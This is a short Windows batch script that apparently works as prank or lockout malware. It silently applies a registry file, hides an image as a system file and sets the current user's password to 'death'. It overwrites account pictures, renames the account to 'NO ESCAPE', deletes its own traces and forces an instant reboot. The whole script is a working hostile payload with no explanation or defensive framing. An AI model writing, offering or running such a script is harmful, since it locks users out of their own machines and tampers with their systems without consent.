regedit /s hello.reg
del C:\hello.reg
attrib +s +h C:\hello.png
net user %username% death
powershell Expand-Archive C:\a.zip -DestinationPath "C:\ProgramData\Microsoft\User Account Pictures\"
wmic useraccount where name='%username%' rename 'NO ESCAPE'
del C:\a.zip
shutdown /t 0 /r